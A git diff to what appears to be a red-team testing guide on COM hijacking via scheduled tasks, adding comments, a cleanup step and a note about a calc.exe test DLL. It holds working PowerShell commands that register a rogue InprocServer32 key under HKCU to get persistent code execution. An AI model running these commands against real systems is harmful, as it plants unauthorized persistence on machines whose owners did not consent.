@@ -17,6 +17,10 @@
 
 ## **COM Hijacking**
 
+**NOTE:**
+
+For COM Hijacks you need a DLL to point to to execute. I created a DLL that runs *C:\Windows\System32\calc.exe* which you can use during the test and placed it in this GitHub Repo.
+
 ### **Enumerating Scheduled Tasks That Call COM Objects**
 
 ```
@@ -43,11 +47,18 @@ foreach ($Task in $Tasks)
 ### **Creating New InprocServer32 Registry Key/Value Pair**
 
 ```
+# Create New CLSID Registry Key in HKCU where it was not defined
 New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{<CLISD-ID>}"
 
+# Set the InprocServer32 Key to point to your DLL
 New-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}" -Name "InprocServer32" -Value "<Path-To-DLL>"
 
+# Set threading to where this DLL gets executed on any COM object calls for this CLSID
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 
- Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"
+# Valid COM Object Registry properly set
+Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"
+
+# Clean Up
+Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
 ```
